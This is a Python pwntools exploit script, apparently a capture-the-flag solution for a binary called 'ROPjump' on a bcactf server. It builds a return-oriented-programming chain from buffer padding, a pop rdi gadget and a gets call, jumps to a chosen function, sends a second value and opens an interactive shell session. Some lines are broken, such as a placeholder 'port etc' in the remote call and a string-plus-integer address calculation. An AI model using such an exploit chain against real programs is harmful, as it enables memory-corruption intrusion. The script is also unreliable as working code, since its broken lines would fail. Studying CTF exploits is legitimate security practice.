from pwn import *

exe = context.binary = ELF('ROPjump')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())
io = remote("bin.bcactf.com", port etc)

main = hex(exe.symbols['main'])+4
bfnc = 0x4011d6+4
gets_plt = exe.plt['gets']
jumps = p64(0x40408c)

pop_rdi = p64(0x4013b3) # pop rdi
ret = p64(0x4013b4) # ret
f_234 = p64(0x3f9df3b6 )

payload = cyclic(120)
payload += pop_rdi
payload += jumps
payload += p64(gets_plt)
payload += p64(bfnc)

io.recvuntil('rt!')
io.sendline(payload)
io.recvuntil('it!')
io.sendline(p64(f_234))
io.interactive()
